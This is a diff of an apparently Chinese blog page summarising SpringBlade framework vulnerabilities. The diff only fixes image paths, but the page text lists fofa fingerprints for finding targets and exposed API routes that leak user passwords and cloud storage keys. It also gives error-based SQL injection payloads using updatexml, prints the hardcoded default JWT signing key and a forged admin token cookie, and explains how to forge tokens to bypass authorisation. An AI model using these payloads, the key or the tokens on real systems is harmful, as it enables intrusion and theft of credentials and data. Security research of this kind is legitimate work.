@@ -318,15 +318,15 @@
 <p><strong>sringblade的特征1</strong></p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">icon_hash</span>=<span class="hljs-string">&quot;1047841028&quot;</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813164919993.png" srcset="/img/loading.gif" lazyload class title="image-20240813164919993">
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813164919993.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813164919993">
 
 <p><strong>特征2</strong></p>
 <p>在页面加载过程中，会出现以下的加载页面，和最下方的<code>https://bladex.vip</code>，此时我们就可以将这个地址放到fofa上去扩大资产</p>
-<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813165144101.png" srcset="/img/loading.gif" lazyload class title="image-20240813165144101">
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813165144101.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813165144101">
 
 <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">fofa：body<span class="hljs-operator">=</span><span class="hljs-string">&quot;https://bladex.vip&quot;</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813165244200.png" srcset="/img/loading.gif" lazyload class title="image-20240813165244200">
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813165244200.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813165244200">
 
 <p><strong>特征3</strong></p>
 <p>在路径中若发现<code>blade</code>，这个字段，也基本可以确定是blade框架</p>
@@ -336,7 +336,7 @@
 <p>下述就是没有修改的路由的案例</p>
 <p>其中比较常见的泄露：</p>
 <p>&#x2F;api&#x2F;blade-system&#x2F;menu&#x2F;buttons   #暴露路由</p>
-<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132515446.png" srcset="/img/loading.gif" lazyload class title="image-20240814132515446">
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132515446.png" srcset="/img/loading.gif" lazyload class="" title="image-20240814132515446">
 
 <p>&#x2F;api&#x2F;blade-system&#x2F;user&#x2F;user-list     #泄露用户名、密码（包括管理员）</p>
 <p>&#x2F;api&#x2F;blade-resource&#x2F;oss&#x2F;list        #泄露AK、SK</p>
@@ -345,30 +345,30 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">下述只对找到的案例存在的路由进行了解释：<br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/user/u</span>ser-list   <span class="hljs-comment">#用户列表</span><br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/tenant/</span>select		<span class="hljs-comment">#租户选择</span><br><span class="hljs-regexp">/api/</span>blade-develop<span class="hljs-regexp">/datasource/</span>list	<br><span class="hljs-regexp">/api/</span>blade-resource<span class="hljs-regexp">/oss/</span>list<br><span class="hljs-regexp">/api/</span>blade-develop<span class="hljs-regexp">/datasource/</span>list<br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/code/</span>remove<br><span class="hljs-regexp">/api/</span>blade-resource<span class="hljs-regexp">/oss/</span>remove<br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/dict-biz/</span>remove<br><span class="hljs-regexp">/authority/</span>role/add    <span class="hljs-comment">#添加用户</span><br><span class="hljs-regexp">/system/</span>dict/add	<span class="hljs-comment">#添加字典</span><br>.......<br></code></pre></td></tr></table></figure>
 
 <h3 id="漏洞二：弱口令-AK、SK泄露"><a href="#漏洞二：弱口令-AK、SK泄露" class="headerlink" title="漏洞二：弱口令&amp;AK、SK泄露"></a>漏洞二：弱口令&amp;AK、SK泄露</h3><p>这个站点很奇葩，当我登录的时候，他自动就把账号和密码（也是弱口令）填写进去了，直接登陆即可了，进去大概看了一下就泄露了</p>
-<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813134409260.png" srcset="/img/loading.gif" lazyload class title="image-20240813134409260">
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813134409260.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813134409260">
 
 <p>然后直接使用ossbrower连接即可</p>
 <h3 id="漏洞三：SQL注入"><a href="#漏洞三：SQL注入" class="headerlink" title="漏洞三：SQL注入"></a>漏洞三：SQL注入</h3><p>第一处：</p>
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/api/blade-<span class="hljs-built_in">log</span>/<span class="hljs-keyword">error</span>/<span class="hljs-built_in">list</span>?updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-built_in">version</span>(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132621776.png" srcset="/img/loading.gif" lazyload class title="image-20240814132621776">
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132621776.png" srcset="/img/loading.gif" lazyload class="" title="image-20240814132621776">
 
 <p>第二处：</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/api/blade-<span class="hljs-keyword">user</span>/export-<span class="hljs-keyword">user</span>?Blade-Auth=[jwt码]&amp;account=&amp;realName=&amp;<span class="hljs-number">1</span>-updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,version(),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>)=<span class="hljs-number">1</span><br><br>如果前端使用的saber，则可以用下述saber-<span class="hljs-keyword">access</span>-token/saber-<span class="hljs-keyword">refresh</span>-token替换上述的jwt码，下面一个漏洞也同理<br><br>```<br>Cookie: saber-<span class="hljs-keyword">access</span>-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwidG9rZW5fdHlwZSI6ImFjY2Vzc190b2tlbiIsImRlcHRfaWQiOiIxMTIzNTk4ODEzNzM4Njc1MjAxIiwiYWNjb3VudCI6ImFkbWluIiwiY2xpZW50X2lkIjoic2FiZXIiLCJleHAiOjE3MjM2MDE3NTcsIm5iZiI6MTcyMzU5ODE1N30.N4arC25-V_qBBlxmjLlvvN2VaZ3iPvc-xht2VEPMOq4; saber-<span class="hljs-keyword">refresh</span>-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInRva2VuX3R5cGUiOiJyZWZyZXNoX3Rva2VuIiwiY2xpZW50X2lkIjoic2FiZXIiLCJleHAiOjE3MjQyMDI5NTcsIm5iZiI6MTcyMzU5ODE1N30<span class="hljs-number">.0</span>U0aZzVdesBjS3VNBFyDN1D7jFWM54XPd6kdWHWL394<br>```<br></code></pre></td></tr></table></figure>
 
-<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132658231.png" srcset="/img/loading.gif" lazyload class title="image-20240814132658231">
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132658231.png" srcset="/img/loading.gif" lazyload class="" title="image-20240814132658231">
 
 <h3 id="漏洞四：JWT硬编码越权"><a href="#漏洞四：JWT硬编码越权" class="headerlink" title="漏洞四：JWT硬编码越权"></a>漏洞四：JWT硬编码越权</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject</span><br></code></pre></td></tr></table></figure>
 
 <p>漏洞原因：开发者在使用jwt进行身份认证时，并没有对默认的jwt密钥进行修改，导致黑客可以利用默认的jwt密钥去伪造jwt值，可以欺骗服务器获取用户权限等</p>
 <p>教程：将上面的密钥放到箭头指示的位置，然后修改payload里的字段，因为服务器都是通过这个payload中的字段进行鉴权的，所以通过修改payload中的字段，来达到伪造jwt欺骗服务器</p>
-<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170002896.png" srcset="/img/loading.gif" lazyload class title="image-20240813170002896">
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170002896.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813170002896">
 
 <p>将修改后的jwt字段，放回Blade-Auth中，放包，看是否回显，若回显，则证明存在jwt硬编码。</p>
-<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170028058.png" srcset="/img/loading.gif" lazyload class title="image-20240813170028058">
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170028058.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813170028058">
 
 <p>不成功则会出现未授权</p>
-<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170043219.png" srcset="/img/loading.gif" lazyload class title=".&#x2F;blade漏洞总结&#x2F;image-20240813170043219">
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170043219.png" srcset="/img/loading.gif" lazyload class="" title=".&#x2F;blade漏洞总结&#x2F;image-20240813170043219">
 
                 
               </div>
